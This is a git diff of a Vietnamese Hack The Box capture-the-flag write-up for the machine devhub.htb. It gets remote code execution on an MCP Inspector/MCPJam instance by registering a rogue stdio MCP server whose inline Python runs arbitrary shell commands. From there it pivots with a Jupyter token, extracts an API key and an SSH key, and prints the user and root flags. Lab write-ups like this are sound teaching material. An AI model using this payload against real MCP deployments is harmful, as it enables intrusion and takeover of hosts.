@@ -13,23 +13,28 @@ weight: Medium
 # Recon 
 - Scan port : `nmap -Pn -sS --min-rate 3000 -p- 10.129.4.84`
 
-![alt text](image-1.png)
+    ![](image-1.png)
 - Scan service : `nmap -Pn -sCV -p22,80 10.129.4.84` 
-![alt text](image-3.png)
+
+    ![](image-3.png)
 - Nhận thấy redirect về `http://devhub.htb/` ; tiến hành test web với host header 
 - Thông tin nhận về thông tin :
     - `MCP Inspector` - Port `6274`
     - `Jupyter` localhost `8888`
-![alt text](image-4.png)
+
+    ![](image-4.png)
 - truy cập vào `http://10.129.4.84:6274/`
-![alt text](image-5.png)
+
+    ![](image-5.png)
 
 # Xác định lỗ hỏng trên MCPJam
 - tải source js về : `curl -s http://10.129.4.84:6274/assets/index-DRYhT9Xb.js -o mcpjam.js`
 - Trong source có đoạn xủ lí e : 
-![alt text](image-6.png)
+
+    ![](image-6.png)
 - Trong Add MCP Server để xem e xử lí như nào :
-![alt text](image-7.png)
+
+    ![](image-7.png)
 - Từ đó có thể suy ra payload 
 ```json
 {
@@ -48,7 +53,8 @@ weight: Medium
 # Đăng kí MCP tự tạo để lấy RCE
 
 - Đăng kí MCP như sau 
-![alt text](image-8.png)
+
+    ![](image-8.png)
 ```py
 POST /api/mcp/connect HTTP/1.1
 
@@ -63,44 +69,33 @@ Content-Length: 1557
 
 
 {
-
   "serverId": "pyexec3",
-
   "serverConfig": {
-
     "name": "pyexec3",
-
     "type": "stdio",
-
     "command": "python3",
-
     "args": [
-
       "-u",
-
       "-c",
-
       "import sys,json,subprocess\n\ndef send(o):\n    sys.stdout.write(json.dumps(o,separators=(\",\",\":\"))+\"\\n\")\n    sys.stdout.flush()\n\nfor line in sys.stdin:\n    try:\n        msg=json.loads(line)\n    except Exception:\n        continue\n    mid=msg.get(\"id\")\n    method=msg.get(\"method\")\n    if method==\"initialize\":\n        send({\"jsonrpc\":\"2.0\",\"id\":mid,\"result\":{\"protocolVersion\":\"2025-06-18\",\"capabilities\":{\"tools\":{}},\"serverInfo\":{\"name\":\"pyexec3\",\"version\":\"1.0.0\"}}})\n    elif method==\"tools/list\":\n        send({\"jsonrpc\":\"2.0\",\"id\":mid,\"result\":{\"tools\":[{\"name\":\"run\",\"description\":\"run shell command\",\"inputSchema\":{\"type\":\"object\",\"properties\":{\"cmd\":{\"type\":\"string\"}},\"required\":[\"cmd\"]}}]}})\n    elif method==\"tools/call\":\n        args=msg.get(\"params\",{}).get(\"arguments\") or {}\n        cmd=args.get(\"cmd\",\"id\")\n        try:\n            p=subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=20)\n            out=p.stdout+p.stderr\n        except Exception as e:\n            out=str(e)\n        send({\"jsonrpc\":\"2.0\",\"id\":mid,\"result\":{\"content\":[{\"type\":\"text\",\"text\":out[:8000]}]}})\n    elif mid is not None:\n        send({\"jsonrpc\":\"2.0\",\"id\":mid,\"result\":{}})\n"
-
     ],
-
     "env": {},
-
     "requestTimeout": 20000
-
   }
-
 }
 ```
 
 - Test command
-![alt text](image-9.png)
+
+    ![](image-9.png)
 
 - Đọc flag với `mcp-dev` tuy nhiên không có
-![alt text](image-10.png)
+
+    ![](image-10.png)
 
 - Kiểm tra user khác có trên máy phát hiện có thêm `analyst`
-![alt text](image-11.png)
+
+    ![](image-11.png)
 
 # Lấy flag user bằng cách pivot sang user khác 
 - Enumerate thông tin 
@@ -122,7 +117,8 @@ Content-Length: 156
 - Lấy được
     - Jupyter token: `a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7`
     - Kernel id: `de456134-0e52-4794-8dff-a325734a098b`
-![alt text](image-12.png)
+
+    ![](image-12.png)
 
 - Dùng token để vào trang của analyst 
 ```json
@@ -139,7 +135,8 @@ Content-Length: 184
   }
 }
 ```
-![alt text](image-13.png)
+
+    ![](image-13.png)
 
 - Dùng kernel id dã có sẵn để đọc user.txt với quyền analyst
 
@@ -157,13 +154,15 @@ Connection: close
   }
 }
 ```
-![alt text](image-14.png)
+
+    ![](image-14.png)
 - user: `9599abcca7ecfc510228348e7d08ef1e`
 
 # Tìm dịch vụ với analyst 
 
 - Phát hiện dịch vụ OPSMCP 
-![alt text](image-15.png)
+
+    ![](image-15.png)
 
 ```json
 POST /api/mcp/tools/execute HTTP/1.1
@@ -181,13 +180,16 @@ Content-Length: 1348
 ```
 
 - Đọc source code và lấy được : VALID_API_KEY = `opsmcp_secret_key_4f5a6b7c8d9e0f1a`
-![alt text](image-16.png)
+
+    ![](image-16.png)
 
 # SSH vào máy chủ và lấy flag root
 - Ngay khi có api key lợi dụng 1 api nội bộ `tool/call` để lấy được private key 
-![alt text](image-17.png)
+
+    ![](image-17.png)
 
 - Ssh trực tiếp vào máy chủ
-![alt text](image-18.png)
+
+    ![](image-18.png)
 
 - flag root : `a96b230e533b7cf25fc18d9c78a736f7`
